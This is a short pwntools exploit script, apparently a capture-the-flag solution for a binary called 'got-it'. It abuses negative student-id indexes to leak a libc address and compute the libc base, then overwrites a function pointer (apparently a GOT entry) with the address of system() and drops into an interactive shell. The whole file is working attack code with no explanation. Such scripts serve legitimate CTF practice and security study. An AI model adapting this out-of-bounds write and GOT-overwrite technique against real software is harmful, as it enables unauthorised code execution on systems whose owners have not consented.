from pwn import*

filename = "./got-it"
elf = ELF(filename)
libc = elf.libc 
local = 1
if local:
    r = process(filename)
else:
    node = ''
    num = 0
    r = remote(node,num)

# gdb.attach(r,"b *0x401457\n b *0x40143F ")
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'sp', '-h']
r.sendlineafter(b">> ",str(2))

r.sendlineafter(b"Input student id: ",str(-4) )

libc_base = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x21b6a0
system_addr = libc_base + libc.symbols['system']
print(hex(libc_base))

r.sendlineafter(b">> ",str(3))
r.sendlineafter(b"Input student id: ",str(-11))
r.sendlineafter(b"Input new student name: ",p64(system_addr))


r.sendlineafter(b">> ",str(0x2023))



r.interactive()



